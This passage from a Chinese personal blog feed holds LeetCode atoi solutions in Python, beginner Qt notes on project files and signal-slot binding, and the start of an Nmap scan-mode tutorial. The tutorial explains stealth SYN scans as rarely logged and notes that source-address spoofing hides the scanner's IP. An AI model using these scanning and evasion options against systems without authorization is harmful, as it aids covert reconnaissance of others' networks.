class="number">0</span>]==<span class="string">'+'</span> <span class="keyword">or</span> str[<span class="number">0</span>]==<span class="string">'-'</span>:</span><br><span class="line">            count+=str[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> str[<span class="number">1</span>:]:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'0'</span>&lt;=i&lt;=<span class="string">'9'</span>:</span><br><span class="line">                    count+=i</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">'0'</span>&lt;=str[<span class="number">0</span>]&lt;=<span class="string">'9'</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'0'</span>&lt;=i&lt;=<span class="string">'9'</span>:</span><br><span class="line">                    count+=i</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> count == <span class="string">'+'</span> <span class="keyword">or</span> count == <span class="string">'-'</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> int(count)&lt;<span class="number">-2147483648</span> :</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-2147483648</span></span><br><span class="line">        <span class="keyword">elif</span> int(count)&gt;<span class="number">2147483647</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2147483647</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> int(count)</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left">提交结果</th><th style="text-align:left">执行用时</th><th style="text-align:left">内存消耗</th><th style="text-align:left">语言</th><th></th></tr></thead><tbody><tr><td style="text-align:left">通过</td><td style="text-align:left">32ms</td><td style="text-align:left">12.9MB</td><td style="text-align:left">Python3</td></tr></tbody></table><p>思路没什么好讲的，一堆ifelse显然易见</p><hr><blockquote><p>我的辣鸡代码</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">myAtoi</span><span class="params">(self, str: str)</span> -&gt; int:</span></span><br><span class="line">        str0 = str.strip()</span><br><span class="line">        <span class="keyword">if</span>(str0==<span class="string">""</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        list0 = [<span class="string">"0"</span>,<span class="string">"1"</span>,<span class="string">"2"</span>,<span class="string">"3"</span>,<span class="string">"4"</span>,<span class="string">"5"</span>,<span class="string">"6"</span>,<span class="string">"7"</span>,<span class="string">"8"</span>,<span class="string">"9"</span>]</span><br><span class="line">        index = <span class="number">-1</span></span><br><span class="line">        <span class="keyword">if</span>(str0[<span class="number">0</span>]==<span class="string">"-"</span>):</span><br><span class="line">            str1 = str0[<span class="number">1</span>:]</span><br><span class="line">            <span class="keyword">if</span>(str1==<span class="string">""</span> <span class="keyword">or</span> str1[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> list0):</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">                <span class="keyword">if</span>(str1[i] <span class="keyword">in</span> list0):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    index = i</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span>(index == <span class="number">-1</span>):</span><br><span class="line">                index = len(str1)</span><br><span class="line">            <span class="keyword">if</span>(int(str0[:index+<span class="number">1</span>])&lt;<span class="number">-2147483648</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"-2147483648"</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> int(str0[:index+<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">elif</span>(str0[<span class="number">0</span>] <span class="keyword">in</span> list0 <span class="keyword">or</span> str0[<span class="number">0</span>] == <span class="string">"+"</span>):</span><br><span class="line">            <span class="keyword">if</span>(str0[<span class="number">0</span>]==<span class="string">"+"</span>):</span><br><span class="line">                str0 = str0[<span class="number">1</span>:]</span><br><span class="line">                <span class="keyword">if</span>(str0 == <span class="string">""</span> <span class="keyword">or</span> str0[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> list0):</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(str0)):</span><br><span class="line">                <span class="keyword">if</span>(str0[i] <span class="keyword">in</span> list0):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    index = i</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span>(index == <span class="number">-1</span>):</span><br><span class="line">                index = len(str0)</span><br><span class="line">            <span class="keyword">if</span>(int(str0[:index])&gt;<span class="number">2147483647</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"2147483647"</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> int(str0[:index])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>提交结果</th><th>执行用时</th><th>内存消耗</th><th>语言</th></tr></thead><tbody><tr><td>通过</td><td>52 ms</td><td>13 MB</td><td>Python3</td></tr></tbody></table><p>代码和上面的第二个代码思路基本一样，但是多了几个冗余的if步骤，所以执行用时很慢</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;LeetCode刷题笔记&quot;&gt;&lt;a href=&quot;#LeetCode刷题笔记&quot; class=&quot;headerlink&quot; title=&quot;LeetCode刷题笔记&quot;&gt;&lt;/a&gt;LeetCode刷题笔记&lt;/h2&gt;&lt;h3 id=&quot;字符串转换整数&quot;&gt;&lt;a href=&quot;#字符串转换整数&quot; class=&quot;headerlink&quot; title=&quot;字符串转换整数&quot;&gt;&lt;/a&gt;字符串转换整数&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;题目链接： &lt;a href=&quot;https://leetcode-cn.com/problems/string-to-integer-atoi/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://leetcode-cn.com/problems/string-to-integer-atoi/&lt;/a&gt; &lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;​    请你来实现一个 atoi 函数，使其能将字符串转换成整数。&lt;/p&gt;
    
    </summary>
    
    
      <category term="LeetCode刷题笔记" scheme="/categories/LeetCode%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="字符串转换整数" scheme="/tags/%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E6%8D%A2%E6%95%B4%E6%95%B0/"/>
    
  </entry>
  
  <entry>
    <title>QT学习笔记（二）</title>
    <link href="/2020/01/23/QT%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>/2020/01/23/QT学习笔记（二）/</id>
    <published>2020-01-23T12:44:15.000Z</published>
    <updated>2020-01-23T14:59:51.234Z</updated>
    
    <content type="html"><![CDATA[<h2 id="QT学习笔记（二）"><a href="#QT学习笔记（二）" class="headerlink" title="QT学习笔记（二）"></a>QT学习笔记（二）</h2><p>咕了好久了，假期学习动力严重欠费，该好好写写blog了。<br><a id="more"></a></p><h3 id="信号与槽机制初探"><a href="#信号与槽机制初探" class="headerlink" title="信号与槽机制初探"></a>信号与槽机制初探</h3><p>信号与槽机制是Qt中一个独特的机制，比如当你按下一个button控件的时候，会发出一个信号，通过创建一个槽来捕获这个信号，捕获时候执行特地的动作，即Qt中的信号发出与处理——信号与槽。</p><h4 id="信号与槽的两种简单实现方式"><a href="#信号与槽的两种简单实现方式" class="headerlink" title="信号与槽的两种简单实现方式"></a>信号与槽的两种简单实现方式</h4><h5 id="信号与槽的手动绑定"><a href="#信号与槽的手动绑定" class="headerlink" title="信号与槽的手动绑定"></a>信号与槽的手动绑定</h5><p>首先打开Qt先新建一个项目，布局一个Push Button，</p><p><img src="https://s2.ax1x.com/2020/01/23/1VtUmD.jpg" alt=""></p><p>在<strong>mainwindow.h</strong>里声明槽函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//mainwindow.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MAINWINDOW_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAINWINDOW_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QMainWindow&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> Ui &#123;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MainWindow</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MainWindow</span> :</span> <span class="keyword">public</span> QMainWindow</span><br><span class="line">&#123;</span><br><span class="line">    Q_OBJECT</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">MainWindow</span><span class="params">(QWidget *parent = <span class="literal">nullptr</span>)</span></span>;</span><br><span class="line">    ~MainWindow();</span><br><span class="line"></span><br><span class="line"><span class="comment">//这里是添加的地方</span></span><br><span class="line"><span class="keyword">public</span> slots:       <span class="comment">//槽函数声明标志</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">A_example</span><span class="params">()</span></span>;    <span class="comment">//槽函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    Ui::MainWindow *ui;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// MAINWINDOW_H</span></span></span><br></pre></td></tr></table></figure><p>声明槽函数后，就要编写槽函数了，可以参考这个<a href="https://www.cnblogs.com/lsgxeva/p/7814072.html" target="_blank" rel="noopener">链接</a>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//mainwindow.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"mainwindow.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"ui_mainwindow.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QMessageBox&gt;</span></span></span><br><span class="line"></span><br><span class="line">MainWindow::MainWindow(QWidget *parent) :</span><br><span class="line">    QMainWindow(parent),</span><br><span class="line">    ui(<span class="keyword">new</span> Ui::MainWindow)</span><br><span class="line">&#123;</span><br><span class="line">    ui-&gt;setupUi(<span class="keyword">this</span>);</span><br><span class="line">    <span class="comment">//添加关联代码，必须放在 setupUi 函数之后</span></span><br><span class="line">        connect(ui-&gt;test, SIGNAL(clicked()), <span class="keyword">this</span>, SLOT(A_example()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MainWindow::~MainWindow()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">delete</span> ui;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//槽函数定义代码，与普通成员函数类似</span></span><br><span class="line"><span class="keyword">void</span> MainWindow::A_example()</span><br><span class="line">&#123;</span><br><span class="line">    QMessageBox::information(<span class="keyword">this</span>, tr(<span class="string">"Example"</span>), tr(<span class="string">"My Test"</span>));<span class="comment">//Qt中使用字符串要用tr函数，原因是tr会调用translate函数，实现一个多国语言翻译功能，比如tr函数里面写的是英文，可以导入翻译包，将英文转换为其它语言</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跑一下试试</p><p><img src="/23/QT学习笔记（二）/Users\dell\AppData\Roaming\Typora\typora-user-images\image-20200123224723243.png" alt=""></p><h5 id="信号与槽的自动绑定"><a href="#信号与槽的自动绑定" class="headerlink" title="信号与槽的自动绑定"></a>信号与槽的自动绑定</h5><p>在这里右击控件，选择转到槽。</p><p><img src="https://s2.ax1x.com/2020/01/23/1V69mR.jpg" alt=""></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"mainwindow.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"ui_mainwindow.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QMessageBox&gt;</span></span></span><br><span class="line"></span><br><span class="line">MainWindow::MainWindow(QWidget *parent) :</span><br><span class="line">    QMainWindow(parent),</span><br><span class="line">    ui(<span class="keyword">new</span> Ui::MainWindow)</span><br><span class="line">&#123;</span><br><span class="line">    ui-&gt;setupUi(<span class="keyword">this</span>);</span><br><span class="line">    <span class="comment">//添加关联代码，必须放在 setupUi 函数之后</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MainWindow::~MainWindow()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">delete</span> ui;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//槽函数定义代码，与普通成员函数类似</span></span><br><span class="line"><span class="keyword">void</span> MainWindow::on_test_clicked()</span><br><span class="line">&#123;</span><br><span class="line">    QMessageBox::information(<span class="keyword">this</span>, tr(<span class="string">"two"</span>), tr(<span class="string">"TWO"</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见运行结果，第二种方法无需自己写connect，较为方便。</p><p><img src="https://s2.ax1x.com/2020/01/23/1V63h8.jpg" alt="1V63h8.jpg"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;QT学习笔记（二）&quot;&gt;&lt;a href=&quot;#QT学习笔记（二）&quot; class=&quot;headerlink&quot; title=&quot;QT学习笔记（二）&quot;&gt;&lt;/a&gt;QT学习笔记（二）&lt;/h2&gt;&lt;p&gt;咕了好久了，假期学习动力严重欠费，该好好写写blog了。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="开发相关" scheme="/categories/%E5%BC%80%E5%8F%91%E7%9B%B8%E5%85%B3/"/>
    
    
      <category term="C++" scheme="/tags/C/"/>
    
      <category term="Qt" scheme="/tags/Qt/"/>
    
  </entry>
  
  <entry>
    <title>QT学习笔记（一）</title>
    <link href="/2020/01/14/QT%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>/2020/01/14/QT学习笔记（一）/</id>
    <published>2020-01-14T11:51:52.000Z</published>
    <updated>2020-01-14T12:01:51.093Z</updated>
    
    <content type="html"><![CDATA[<h2 id="QT学习笔记（一）"><a href="#QT学习笔记（一）" class="headerlink" title="QT学习笔记（一）"></a>QT学习笔记（一）</h2><h3 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h3><p>我下载的是<a href="https://mirrors.tuna.tsinghua.edu.cn/qt/archive/qt/5.12/5.12.3/" target="_blank" rel="noopener">Qt5.12.3</a>，点开无脑傻瓜式安装。<br><a id="more"></a><br><img src="https://s2.ax1x.com/2020/01/14/lqat2T.jpg" alt="Qt"></p><p>需要注意的有几点：</p><p>1.有可能出现下载器下载不下来的玄学状况，可以重新尝试用浏览器直接下载(速度还挺快)</p><p>2.安装组件时候的坑，选择如下图的组件</p><p><img src="https://s2.ax1x.com/2020/01/14/lqafqH.jpg" alt="组件列表"></p><p><strong>MSVC 2017 64-bit</strong>是保证可以使用VS进行编辑，<strong>MinGW 7.3.0 64-bit</strong>是保证在Windows下有能够运行的编译器，下面一堆QT打头的是预先装好防止之后需要重新添加组件的。</p><p>3.建议预先装好所有可能需要装的组件，因为会出现使用<strong>MaintenanceTool</strong>，添加临时存储库后，无法添加新的组件，只能删除已有组件，查询解决方案未果，所以只能预先装好，否则只能重新安装。</p><hr><h3 id="Qt文件结构"><a href="#Qt文件结构" class="headerlink" title="Qt文件结构"></a>Qt文件结构</h3><p>Qt的文件组成有四个部分</p><p><img src="https://s2.ax1x.com/2020/01/14/lqwdE9.jpg" alt="image-20200114174320406"></p><blockquote><p>pro文件是存储项目设置的文件, 用于记录项目的一些设置，以及项目包含文件的组织管理。  </p></blockquote><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-------------------------------------------------</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Project created by QtCreator 2020-01-14T17:42:35</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#-------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">QT       += core gui</span><br><span class="line"></span><br><span class="line">greaterThan(QT_MAJOR_VERSION, 4): QT += widgets</span><br><span class="line"></span><br><span class="line">TARGET = Demo</span><br><span class="line">TEMPLATE = app</span><br><span class="line"></span><br><span class="line"><span class="comment"># The following define makes your compiler emit warnings if you use</span></span><br><span class="line"><span class="comment"># any feature of Qt which has been marked as deprecated (the exact warnings</span></span><br><span class="line"><span class="comment"># depend on your compiler). Please consult the documentation of the</span></span><br><span class="line"><span class="comment"># deprecated API in order to know how to port your code away from it.</span></span><br><span class="line">DEFINES += QT_DEPRECATED_WARNINGS</span><br><span class="line"></span><br><span class="line"><span class="comment"># You can also make your code fail to compile if you use deprecated APIs.</span></span><br><span class="line"><span class="comment"># In order to do so, uncomment the following line.</span></span><br><span class="line"><span class="comment"># You can also select to disable deprecated APIs only up to a certain version of Qt.</span></span><br><span class="line"><span class="comment">#DEFINES += QT_DISABLE_DEPRECATED_BEFORE=0x060000    # disables all the APIs deprecated before Qt 6.0.0</span></span><br><span class="line"></span><br><span class="line">CONFIG += c++11</span><br><span class="line"></span><br><span class="line">SOURCES += \</span><br><span class="line">        main.cpp \</span><br><span class="line">        mainwindow.cpp</span><br><span class="line"></span><br><span class="line">HEADERS += \</span><br><span class="line">        mainwindow.h</span><br><span class="line"></span><br><span class="line">FORMS += \</span><br><span class="line">        mainwindow.ui</span><br><span class="line"></span><br><span class="line"><span class="comment"># Default rules for deployment.</span></span><br><span class="line"><span class="section">qnx: target.path = /tmp/$$&#123;TARGET&#125;/bin</span></span><br><span class="line"><span class="section">else: unix:!android: target.path = /opt/$$&#123;TARGET&#125;/bin</span></span><br><span class="line"><span class="section">!isEmpty(target.path): INSTALLS += target</span></span><br></pre></td></tr></table></figure><p> “Qt += core gui”表示项目中加入 core gui 模块。core gui 是 Qt 用于 GUI 设计的类库模块，如果创建的是控制台（Console）应用程序，就不需要添加 core gui。 </p><p>greaterThan代表如果Qt版本大于4，才会加入widgets模块。</p><p>TARGET表示生成的可执行文件的名字是Demo.exe。</p><p>TEMPLATE示项目使用的模板是 app，是一般的应用程序。 </p><p>后面的 SOURCES、HEADERS、FORMS 记录了项目中包含的源程序文件、头文件和窗体文件（.ui 文件）的名称。这些文件列表是 Qt Creator 自动添加到项目管理文件里面的，用户不需要手动修改。</p><blockquote><p>Headers表示所引用的头文件。</p></blockquote><blockquote><p>sources表示源代码部分。</p></blockquote><blockquote><p>Forms表示可视化设计的窗体的定义文件，例如各个元素的位置等。</p></blockquote><hr><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>首先打开Qt</p><p><img src="https://s2.ax1x.com/2020/01/14/lqdB6S.jpg" alt="Qt打开"></p><p>新建一个文件或项目，选择第一个。</p><p><img src="https://s2.ax1x.com/2020/01/14/lqwMAs.png" alt="image-20200114174141173"></p><p>在入门阶段无脑下一步即可，点开ui文件，加入Lable标签,。</p><p><img src="https://s2.ax1x.com/2020/01/14/lqI6HA.jpg" alt=""></p><p>加入PushButton，使用信号与槽，把button按钮设置为最小化。</p><p><img src="https://s2.ax1x.com/2020/01/14/lqogr4.jpg" alt=""></p><p><img src="https://s2.ax1x.com/2020/01/14/lqo5Px.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;QT学习笔记（一）&quot;&gt;&lt;a href=&quot;#QT学习笔记（一）&quot; class=&quot;headerlink&quot; title=&quot;QT学习笔记（一）&quot;&gt;&lt;/a&gt;QT学习笔记（一）&lt;/h2&gt;&lt;h3 id=&quot;安装过程&quot;&gt;&lt;a href=&quot;#安装过程&quot; class=&quot;headerlink&quot; title=&quot;安装过程&quot;&gt;&lt;/a&gt;安装过程&lt;/h3&gt;&lt;p&gt;我下载的是&lt;a href=&quot;https://mirrors.tuna.tsinghua.edu.cn/qt/archive/qt/5.12/5.12.3/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Qt5.12.3&lt;/a&gt;，点开无脑傻瓜式安装。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="开发相关" scheme="/categories/%E5%BC%80%E5%8F%91%E7%9B%B8%E5%85%B3/"/>
    
    
      <category term="C++" scheme="/tags/C/"/>
    
      <category term="Qt" scheme="/tags/Qt/"/>
    
  </entry>
  
  <entry>
    <title>Nmap扫描模式初探究</title>
    <link href="/2019/11/16/Nmap%E6%89%AB%E6%8F%8F%E6%A8%A1%E5%BC%8F%E5%88%9D%E6%8E%A2%E7%A9%B6/"/>
    <id>/2019/11/16/Nmap扫描模式初探究/</id>
    <published>2019-11-16T14:24:26.000Z</published>
    <updated>2019-11-16T14:24:06.689Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Nmap扫描模式探究"><a href="#Nmap扫描模式探究" class="headerlink" title="Nmap扫描模式探究"></a>Nmap扫描模式探究</h2><p>一直只会Nmap最基本的扫描，对于Nmap的很多扫描模式没有深入探究，这次尝试学习一下。（重点是我挖不出来洞了，tcl</p><a id="more"></a><h3 id="Nmap简介"><a href="#Nmap简介" class="headerlink" title="Nmap简介"></a>Nmap简介</h3><p>Nmap是一款开源免费的网络发现（Network Discovery）和安全审计（Security Auditing）工具。软件名字Nmap是Network Mapper的简称。Nmap最初是由Fyodor在1997年开始创建的。随后在开源社区众多的志愿者参与下，该工具逐渐成为最为流行安全必备工具之一。</p><h3 id="Nmap常用参数"><a href="#Nmap常用参数" class="headerlink" title="Nmap常用参数"></a>Nmap常用参数</h3><p>我对Nmap的了解一直很浅，只是当作一个可以扫描端口的工具。</p><blockquote><p>nmap 127.0.0.1 -p 1-65535</p></blockquote><p>我一般都是用这种非常浅显的语句进行扫描的，但是Nmap常用的参数有很多，-sS -p -sv 等等，主要针对Nmap的扫描模式进行探究。</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-<span class="ruby"><span class="symbol">T4:</span>  快速扫描（可以加快执行速度）</span></span><br><span class="line"><span class="ruby">-sn：Ping扫描， 不进行端口扫描（-sn被称为-sP）</span></span><br><span class="line"><span class="ruby">-<span class="symbol">sA:</span>  发送tcp的ack包进行探测，可以探测主机是否存活</span></span><br><span class="line"><span class="ruby">-<span class="symbol">sS:</span>  半开放扫描（半开扫描，很少有系统能把它记入系统日志，非<span class="number">3</span>次握手的tcp扫描）</span></span><br><span class="line"><span class="ruby">-sT：<span class="number">3</span>次握手方式tcp的扫描,慢</span></span><br><span class="line"><span class="ruby">-sU：udp端口的扫描</span></span><br><span class="line"><span class="ruby">-sF：也是tcp的扫描一种，发送一个FIN标志的数据包</span></span><br><span class="line"><span class="ruby">-sV：版本检测(sV)</span></span><br><span class="line"><span class="ruby">-<span class="symbol">Pn:</span>  跳过主机发现，进行深入扫描（防止主机过滤ping扫描，可直接进行端口扫描）</span></span><br><span class="line"><span class="ruby">-<span class="symbol">O:</span>    操作系统检测</span></span><br><span class="line"><span class="ruby">-<span class="symbol">A:</span>    参数，综合扫描。比较慢，不推荐</span></span><br><span class="line"><span class="ruby">-e：  指定网络接口,扫描时使用哪个网卡</span></span><br><span class="line"><span class="ruby"><span class="string">`nmap -e eth0 192.168.1.1/24`</span></span></span><br><span class="line"><span class="ruby">-S：  可以伪装源地址进行扫描。这样好处在于不会被对方发现自己的真实IP</span></span><br></pre></td></tr></table></figure><p>调几个重要的说一下</p><h4 id="sS"><a href="#sS" class="headerlink" title="-sS"></a>-sS</h4><p>首先放一张TCP三次握手的图</p><p><img src="https://s2.ax1x.com/2019/11/16/MBUolT.png" alt="三次握手"></p><p>可以看出要扫描端口，客户端先给服务器发送一个SYN包，seq是客户端发送的一个随机数，服务端如果对应的端口是开放的，会返回一个ack包代表接收到了，ack=x+1，代表回应的是seq=x的这条请求，也返回了ACK和SYN包。然后客户端收到ACK和SYN之后，知道服务端对应端口是开放的，但是不接着往下发包，就没有构成一个完整的TCP连接，一般来说服务端也不会记录下这种行为，所以这种方式较为隐蔽。</p><h4 id="sT"><a href="#sT" class="headerlink" title="-sT"></a>-sT</h4><p>这种模式是直接进行TCP连接，连上了就开放，连不上端口就是关闭，缺点是会留下大量的错误日志。</p><h4 id="sP"><a href="#sP" class="headerlink" title="-sP"></a>-sP</h4><p>这种模式是ping扫描，只有主机存活才可以使用，默认不加扫描模式的话就是这一种扫描。</p><h4 id="sU"><a href="#sU" class="headerlink" title="-sU"></a>-sU</h4><p>这种方式是UDP端口扫描。它不需要发送任何的SYN包，因为这种技术是针对UDP端口的。UDP扫描发送UDP数据包到目标主机，并等待响应,如果返回ICMP不可达的错误消息，说明端口是关闭的，如果得到正确的适当的回应，说明端口是开放的.udp端口扫描速度比较慢。但是UDP只管发包，并不关心包在传输途中是否丢失，如果包丢失，会无法检测。</p><h4 id="sF"><a href="#sF" class="headerlink" 